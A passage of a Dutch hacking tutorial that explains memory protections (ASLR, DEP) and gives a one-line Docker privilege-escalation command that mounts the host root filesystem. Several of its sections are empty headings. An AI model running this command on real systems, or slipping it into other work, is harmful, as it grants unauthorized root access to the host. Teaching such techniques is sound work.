Address Space Layout Randomization is een techniek waarmee het uitbuiten van zwakheden in het geheugen lastiger gemaakt is. Dit bereikt men door de beginpunten van onder andere de applicatie, de heap, de stack en imports te randomiseren. Doordat deze geheugenpunten verschillen is het voor een aanvaller lastiger om een (betrouwbare) exploit te ontwikkelen.

Omdat je als aanvaller het geheugenpunt meestal zal moeten raden, is de kans aanzienlijk dat je fout gokt. Als je fout gokt zal een applicatie meestal zijn uitvoering staken.   

### DEP ###
DEP, voluit Data Execution Prevention, ([Windows](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx) is een methode waarmee Microsoft tracht te voorkomen dat een kwaadwillende code kan uitvoeren in een geheugenbereik die als non-executable gemarkeerd is. Aangezien DEP pas geïntroduceerd is in [Windows XP](https://en.wikipedia.org/wiki/Windows_XP) [SP2](https://en.wikipedia.org/wiki/Windows_XP#Service_Pack_2), is dit OS met [SP1](https://en.wikipedia.org/wiki/Windows_XP#Service_Pack_1) uitermate geschikt om in te oefenen.

Er bestaan onder Windows twee varianten van DEP, namelijk de softwarematige DEP en de hardwarematige DEP. De softwarematige DEP beschermd niet tegen het uitvoeren van code in het geheugen maar juist wel tegen een SEH overflow.

Hardwarematige DEP is, in Windows, pas geïntroduceerd in [Windows Vista](https://nl.wikipedia.org/wiki/Windows_Vista). Bij hardwarematige DEP word er een expliciet stukje geheugen aangemerkt als niet uitvoerbaar en dit zal door de processor worden afgedwongen. Voor een verdere uitleg hierover zie het kopje NX-Bit.

### NX-Bit ###

### RELRO ###

### Canary ###

### SSP ###

### PIE ###

## Privilege escalation ##
### Docker ###
Als je een terminal toegang hebt in Docker kan je privilege escalation toepassen door het volgende commando te draaien:

    $> docker run -it --rm -v /:/mnt bash

Omdat Docker altijd als root draait open je nu een bash terminal vanuit het host filesystem als root.

# Dankwoord #

Proofreaders, zonder jullie trouwe leeshulp stonden hier nog meer fouten :-) 
Github, bedankt voor het hosten :)

Wil jij ook opgenomen worden in dit dankwoord? Begin dan met bijdragen op de [github](https://github.com/gatochhacken/gatochhacken.github.io). Dit kan je doen door actief contributes te doen, of door issues aan te maken met fouten/requests die je graag wilt zien.



<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-118698551-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-118698551-1');
</script>
